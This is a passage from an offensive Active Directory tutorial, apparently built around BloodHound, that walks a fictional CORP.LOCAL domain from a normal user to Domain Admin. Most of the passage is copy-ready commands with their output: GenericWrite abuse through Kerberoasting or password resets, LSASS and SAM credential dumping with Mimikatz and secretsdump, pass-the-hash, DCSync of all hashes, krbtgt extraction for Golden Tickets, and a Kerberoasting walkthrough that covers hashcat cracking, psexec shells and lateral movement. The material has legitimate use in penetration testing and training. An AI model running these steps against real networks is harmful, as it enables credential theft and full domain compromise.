RETURN g.name, type(r) AS Permission, labels(t) AS TargetType, t.name AS Target
```
**Use:** Identify privilege escalation via group membership

---

### Step 16: Analyzing Attack Paths (Detailed Walkthrough)

**Scenario:** You found this path:

```
JOHN.DOE@CORP.LOCAL
  ↓ MemberOf
IT-SUPPORT@CORP.LOCAL
  ↓ GenericWrite
HELPDESK-ADMIN@CORP.LOCAL
  ↓ MemberOf
SERVER-ADMINS@CORP.LOCAL
  ↓ AdminTo
FILE-SERVER01.CORP.LOCAL
  ↓ HasSession
DA-ADMIN@CORP.LOCAL
  ↓ MemberOf
DOMAIN ADMINS@CORP.LOCAL
```

#### Breaking Down Each Relationship:

**Relationship 1: MemberOf (JOHN.DOE → IT-SUPPORT)**
- **Type:** Group membership
- **Exploitable:** No (informational)
- **Action:** None required (we already have this access)
- **Notes:** This is our starting point

---

**Relationship 2: GenericWrite (IT-SUPPORT → HELPDESK-ADMIN)**
- **Type:** ACL-based permission
- **Exploitable:** YES ✓
- **What it means:** IT-Support group can modify ANY property on helpdesk-admin user account

**Click on the edge (arrow) to see exploitation details:**

```
Help Panel Shows:
─────────────────────────────────────
GenericWrite

The IT-SUPPORT@CORP.LOCAL group has GenericWrite permissions on the 
HELPDESK-ADMIN@CORP.LOCAL user. This means members of IT-SUPPORT can 
modify any non-protected property on the target user.

Abuse Info:
You can abuse this by:
1. Adding an SPN to the user, making it Kerberoastable
2. Modifying the user's scriptPath to execute code
3. Changing the user's logon script

Windows Abuse:
Set-DomainObject -Identity helpdesk-admin -Set @{serviceprincipalname='HTTP/fake'}

Linux Abuse:
python3 targetedKerberoast.py -d corp.local -u john.doe -p Password123
─────────────────────────────────────
```

**Exploitation Steps:**

**Option A: Kerberoasting (Recommended - Less Noisy)**

From Windows (as john.doe):
```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Add SPN to target user
Set-DomainObject -Identity helpdesk-admin -Set @{serviceprincipalname='HTTP/fake.corp.local'}

# Kerberoast the account
Rubeus.exe kerberoast /user:helpdesk-admin /nowrap

# Output:
$krb5tgs$23$*helpdesk-admin$corp.local$HTTP/fake.corp.local@corp.local*$HASH...

# Crack offline:
hashcat -m 13100 -a 0 hash.txt rockyou.txt --force
```

From Linux (as john.doe):
```bash
# Use targetedKerberoast.py
python3 targetedKerberoast.py -d corp.local -u 'john.doe' -p 'Password123' --target helpdesk-admin

# Crack the hash:
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

**Option B: Targeted Password Change (Noisier - Creates Event Log)**

From Windows:
```powershell
# Change password (will be logged)
$SecPassword = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity helpdesk-admin -AccountPassword $SecPassword

# Authenticate as helpdesk-admin:
runas /user:corp\helpdesk-admin cmd
# Enter: NewPass123!
```

From Linux:
```bash
# Use rpcclient to change password
rpcclient -U 'corp/john.doe%Password123' //192.168.1.10 -c "setuserinfo2 helpdesk-admin 23 'NewPass123!'"

# Verify:
crackmapexec smb 192.168.1.10 -u 'helpdesk-admin' -p 'NewPass123!' --shares
```

**✓ Result:** You now have credentials for helpdesk-admin

---

**Relationship 3: MemberOf (HELPDESK-ADMIN → SERVER-ADMINS)**
- **Type:** Group membership
- **Exploitable:** No (automatic privilege inheritance)
- **Action:** Authenticate as helpdesk-admin (obtained in previous step)
- **Notes:** Server-Admins rights are inherited automatically

---

**Relationship 4: AdminTo (SERVER-ADMINS → FILE-SERVER01)**
- **Type:** Local Administrator Rights
- **Exploitable:** YES ✓
- **What it means:** helpdesk-admin (via Server-Admins group) has local admin on FILE-SERVER01

**Click edge for exploitation details:**

```
AdminTo

The SERVER-ADMINS@CORP.LOCAL group has local administrator rights on 
FILE-SERVER01.CORP.LOCAL.

Abuse Info:
As a local administrator, you can:
- Execute commands remotely
- Dump credentials from memory
- Extract cached credentials
- Install malware/persistence

Windows Abuse:
Invoke-Command -ComputerName FILE-SERVER01 -ScriptBlock {whoami}

Linux Abuse:
psexec.py corp/helpdesk-admin:CrackedPass@FILE-SERVER01.corp.local
```

**Exploitation Steps:**

From Windows (as helpdesk-admin):
```powershell
# Test access:
Invoke-Command -ComputerName FILE-SERVER01 -ScriptBlock {hostname}
# Output: FILE-SERVER01

# Dump credentials:
Invoke-Mimikatz -ComputerName FILE-SERVER01 -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# Or extract SAM database:
Invoke-Command -ComputerName FILE-SERVER01 -ScriptBlock {
    reg save HKLM\SAM C:\Windows\Temp\sam.save
    reg save HKLM\SYSTEM C:\Windows\Temp\system.save
}

# Copy back and parse:
Copy-Item \\FILE-SERVER01\C$\Windows\Temp\*.save C:\Temp\
secretsdump.py -sam sam.save -system system.save LOCAL
```

From Linux (as helpdesk-admin):
```bash
# Execute commands:
psexec.py 'corp/helpdesk-admin:CrackedPass@FILE-SERVER01.corp.local'

# Or use CrackMapExec:
crackmapexec smb FILE-SERVER01.corp.local -u 'helpdesk-admin' -p 'CrackedPass' -x whoami

# Dump credentials:
secretsdump.py 'corp/helpdesk-admin:CrackedPass@FILE-SERVER01.corp.local'

# Dump LSASS:
crackmapexec smb FILE-SERVER01.corp.local -u 'helpdesk-admin' -p 'CrackedPass' -M lsassy
```

**✓ Result:** You extract credentials from FILE-SERVER01

---

**Relationship 5: HasSession (DA-ADMIN → FILE-SERVER01)**
- **Type:** Active Session
- **Exploitable:** YES ✓ (combined with previous AdminTo)
- **What it means:** DA-ADMIN user is currently logged into FILE-SERVER01

**This is the key exploitation opportunity!**

```
HasSession

The DA-ADMIN@CORP.LOCAL user has an active session on FILE-SERVER01.CORP.LOCAL.

Abuse Info:
Since you have local admin on FILE-SERVER01 (from previous step), and 
DA-ADMIN is logged in, you can extract DA-ADMIN's credentials from memory.

This is the classic "Pass-the-Hash" or credential theft scenario.

Windows Abuse:
Invoke-Mimikatz -ComputerName FILE-SERVER01 -Command '"sekurlsa::logonpasswords"'

Linux Abuse:
secretsdump.py will extract logged-on user credentials automatically
```

**Exploitation Steps:**

From Windows (continuing from previous step):
```powershell
# Dump credentials on FILE-SERVER01:
Invoke-Mimikatz -ComputerName FILE-SERVER01 -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# Output includes:
Authentication Id : 0 ; 1234567 (00000000:0012d687)
Session           : Interactive from 1
User Name         : DA-Admin
Domain            : CORP
Logon Server      : DC01
Logon Time        : 10/24/2025 2:45:12 PM
SID               : S-1-5-21-123456789-123456789-123456789-1108
    msv :
     [00000003] Primary
     * Username : DA-Admin
     * Domain   : CORP
     * NTLM     : aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
    kerberos :
     * Username : DA-Admin
     * Domain   : CORP.LOCAL
     * Password : (null)
    tspkg :
     * Username : DA-Admin
     * Domain   : CORP
     * Password : SuperSecretDAPassword123!

# Extract NTLM hash or plaintext password (if WDigest enabled)
# NTLM Hash: 8846f7eaee8fb117ad06bdd830b7586c
# OR
# Plaintext: SuperSecretDAPassword123!
```

From Linux:
```bash
# Dump all credentials from FILE-SERVER01:
secretsdump.py 'corp/helpdesk-admin:CrackedPass@FILE-SERVER01.corp.local'

# Look for DA-ADMIN in output:
[*] Dumping cached domain logon information (domain/username:hash)
CORP.LOCAL/DA-Admin:$DCC2$10240#DA-Admin#hash...

# Or extract NTLM hash:
crackmapexec smb FILE-SERVER01.corp.local -u 'helpdesk-admin' -p 'CrackedPass' --lsa

# Output:
CORP\DA-Admin:8846f7eaee8fb117ad06bdd830b7586c
```

**✓ Result:** You have DA-ADMIN's NTLM hash or password

---

**Relationship 6: MemberOf (DA-ADMIN → DOMAIN ADMINS)**
- **Type:** Group membership
- **Exploitable:** No (informational)
- **Action:** Authenticate as DA-ADMIN
- **Notes:** This grants Domain Admin privileges

**Final Exploitation:**

From Windows:
```powershell
# Pass-the-Hash with Mimikatz:
sekurlsa::pth /user:DA-Admin /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:powershell.exe

# OR use plaintext password:
runas /user:corp\da-admin "powershell.exe"
# Enter: SuperSecretDAPassword123!

# Verify Domain Admin access:
Get-ADGroupMember -Identity "Domain Admins"

# Access Domain Controller:
Enter-PSSession -ComputerName DC01

# Dump all domain hashes (DCSync):
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.local /all"'
```

From Linux:
```bash
# Pass-the-Hash to DC:
psexec.py -hashes ':8846f7eaee8fb117ad06bdd830b7586c' 'corp/DA-Admin@DC01.corp.local'

# OR with password:
psexec.py 'corp/DA-Admin:SuperSecretDAPassword123!@DC01.corp.local'

# DCSync attack (dump all hashes):
secretsdump.py 'corp/DA-Admin@DC01.corp.local' -hashes ':8846f7eaee8fb117ad06bdd830b7586c' -just-dc

# Extract krbtgt for Golden Ticket:
secretsdump.py 'corp/DA-Admin@DC01.corp.local' -hashes ':8846f7eaee8fb117ad06bdd830b7586c' -just-dc-user krbtgt
```

**✓✓✓ RESULT: DOMAIN ADMIN ACHIEVED ✓✓✓**

---

## Exploitation Walkthroughs

### Walkthrough 1: Kerberoasting Attack

**Pre-requisite:** BloodHound identified Kerberoastable accounts

#### Step 1: Identify Targets in BloodHound

```cypher
MATCH (u:User {hasspn:true})
WHERE u.enabled = true
  AND NOT u.name STARTS WITH 'KRBTGT'
RETURN u.name, u.serviceprincipalnames, u.pwdlastset
ORDER BY u.pwdlastset ASC
```

**Example Result:**
```
| Name | SPN | Password Last Set |
|------|-----|-------------------|
| SQLSERVICE@CORP.LOCAL | MSSQLSvc/SQL01:1433 | 2020-03-15 (5 years old!) |
| WEBSERVICE@CORP.LOCAL | HTTP/web01 | 2023-06-20 |
| BACKUPSERVICE@CORP.LOCAL | backupexec/backup01 | 2024-01-10 |
```

**Target:** SQLSERVICE (oldest password)

#### Step 2: Check Target Privileges

Click on SQLSERVICE@CORP.LOCAL node:
- Check "Local Admin Rights" tab → Admin on SQL01, SQL02, SQL03
- Check "Group Membership" tab → Member of "Database-Admins"
- **Assessment:** High-value target!

#### Step 3: Request Service Ticket (Kerberoast)

**From Windows:**
```powershell
# Using Rubeus (recommended):
.\Rubeus.exe kerberoast /user:sqlservice /nowrap

# Output:
[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*] NOTICE: Use /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : sqlservice
[*] Target Domain          : corp.local
[*] Searching path 'LDAP://DC01.corp.local/DC=corp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=sqlservice)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : sqlservice
[*] DistinguishedName      : CN=SQL Service,OU=Service Accounts,DC=corp,DC=local
[*] ServicePrincipalName   : MSSQLSvc/SQL01.corp.local:1433
[*] PwdLastSet             : 3/15/2020 10:23:45 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*sqlservice$corp.local$MSSQLSvc/SQL01.corp.local:1433*$HASH_HERE...

# Copy the hash (everything from $krb5tgs$ to the end)
```

**From Linux (Kali):**
```bash
# Using GetUserSPNs.py (Impacket):
GetUserSPNs.py corp.local/john.doe:Password123 -dc-ip 192.168.1.10 -request -outputfile hashes.txt

# Output:
ServicePrincipalName           Name        MemberOf                                       PasswordLastSet             LastLogon  Delegation 
-----------------------------  ----------  ---------------------------------------------  --------------------------  ---------  ----------
MSSQLSvc/SQL01.corp.local:1433 sqlservice  CN=Database-Admins,OU=Groups,DC=corp,DC=local  2020-03-15 10:23:45.123456  <never>               

# Hash saved to hashes.txt:
cat hashes.txt
$krb5tgs$23$*sqlservice$corp.local$MSSQLSvc/SQL01.corp.local:1433*$HASH_HERE...
```

#### Step 4: Crack the Hash Offline

```bash
# Copy hash to file:
echo '$krb5tgs$23$*sqlservice$...' > sqlservice_hash.txt

# Crack with hashcat:
hashcat -m 13100 -a 0 sqlservice_hash.txt /usr/share/wordlists/rockyou.txt --force

# Expected output after some time:
$krb5tgs$23$*sqlservice$corp.local$...]:SQLPass123!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Time.Started.....: Fri Oct 24 18:30:15 2025
Time.Estimated...: Fri Oct 24 18:35:22 2025 (5 mins 7 secs)

# Password found: SQLPass123!
```

**Alternative wordlists if rockyou fails:**
```bash
# Try common passwords first:
hashcat -m 13100 sqlservice_hash.txt /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt

# Mask attack (if you know password pattern):
# Example: Service accounts often use "Password", season, year
hashcat -m 13100 sqlservice_hash.txt -a 3 'Password?d?d?d?d' 
# Tries: Password2020, Password2021, etc.

# Combination attack:
hashcat -m 13100 sqlservice_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

#### Step 5: Verify Credentials

```bash
# Test authentication:
crackmapexec smb SQL01.corp.local -u 'sqlservice' -p 'SQLPass123!'

SMB         SQL01.corp.local    445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:corp.local) (signing:False) (SMBv1:False)
SMB         SQL01.corp.local    445    SQL01            [+] corp.local\sqlservice:SQLPass123! (Pwn3d!)
```

✅ **"(Pwn3d!)"** = Local Admin!

#### Step 6: Exploitation

```bash
# Get shell:
psexec.py 'corp/sqlservice:SQLPass123!@SQL01.corp.local'

# Or dump more credentials:
secretsdump.py 'corp/sqlservice:SQLPass123!@SQL01.corp.local'

# Pivot to other SQL servers:
crackmapexec smb SQL02.corp.local SQL03.corp.local -u 'sqlservice' -p 'SQLPass123!' --shares
```

**Mark in BloodHound:**
1. Right-click SQLSERVICE@CORP.LOCAL node
2. Mark as Owned
3. Run: "Find Shortest Paths from Owned Principals to Domain Admins"
4. Identify next target

---

### Walkthrough 2: ACL Abuse (GenericAll Exploitation)

**Scenario:** BloodHound shows you have GenericAll on a high-value user

#### Step 1: Find ACL-Based Paths

```cypher
MATCH (u:User {name:'JOHN.DOE@CORP.LOCAL'})
MATCH (u)-[:MemberOf*1..]->(g:Group)
MATCH (g)-[r:GenericAll]->(target:User)
WHERE target.enabled = true
RETURN g.name, target.name, target.admincount
```